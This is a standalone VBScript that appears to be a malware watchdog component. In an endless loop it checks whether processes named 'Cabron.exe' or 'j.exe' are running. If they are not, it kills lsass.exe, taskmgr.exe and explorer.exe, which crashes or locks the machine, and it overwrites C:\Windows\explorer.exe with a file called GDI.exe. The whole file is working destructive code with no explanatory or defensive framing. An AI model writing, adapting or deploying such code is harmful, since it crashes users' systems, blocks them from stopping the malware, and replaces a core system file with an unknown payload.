Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set FSO = CreateObject("Scripting.FileSystemObject")

Do

Set colGDIProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Cabron.exe'")
If colGDIProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'lsass.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
    Next
End If

Set colJProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'j.exe'")
If colJProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'lsass.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
    Next
End If

Set colJProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'j.exe'")
If colJProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
    Next

End If

Set colGDIProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Cabron.exe'")
If colGDIProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
    Next
End If

Set colGDIProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Cabron.exe'")
If colGDIProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'explorer.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
        FSO.MoveFile "C:\.data\GDI.exe", "C:\Windows\explorer.exe"    
    Next
End If

Set colGDIProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'j.exe'")
If colGDIProcesses.Count = 0 Then
    Set colPaintProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'explorer.exe'")
    For Each objPaintProcess in colPaintProcesses
        objPaintProcess.Terminate()
        FSO.MoveFile "C:\.data\GDI.exe", "C:\Windows\explorer.exe"    
    Next
End If



Loop